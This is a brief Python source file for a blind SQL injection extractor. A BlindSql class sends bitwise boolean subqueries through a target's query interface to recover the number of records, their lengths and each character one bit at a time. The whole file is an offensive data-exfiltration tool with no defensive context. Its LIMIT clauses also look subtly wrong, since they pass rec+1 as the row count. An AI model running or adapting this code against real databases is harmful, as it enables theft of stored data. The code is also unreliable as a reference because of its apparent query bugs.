class BlindSql:
    def __init__(self, iface, max_record_bits, max_length_bits):
        self.interface = iface
        self.max_record_bits = max_record_bits
        self.max_length_bits = max_length_bits
    def run(self, select, where):
        #Find number of records
        numrecs = 0
        for bit in range(self.max_record_bits):
            q = "(select count(*) {}) & {} = 0".format(where, 2**bit)
            if(not self.interface.runQuery(q)):
                numrecs += 2**bit
        records = []
        for rec in range(numrecs):
            reclength = 0
            limit = "limit {},{}".format(rec, rec+1)
            for bit in range(self.max_length_bits):
                q = "(select length({}) {} limit {},{}) & {}".format(select, where, rec, rec+1, 2**bit)
                if(self.interface.runQuery(q)):
                    reclength += 2**bit
            record = ''
            for char in range(1, reclength+1):
                code = 0
                for bit in range(8):
                    q = "(select ord(substr({}, {}, {})) {} limit {},{}) & {}".format(select, char, '1', where, rec, rec+1, 2**bit)
                    if(self.interface.runQuery(q)):
                        code += 2**bit
                record += chr(code)
            records.append(record)
        return records
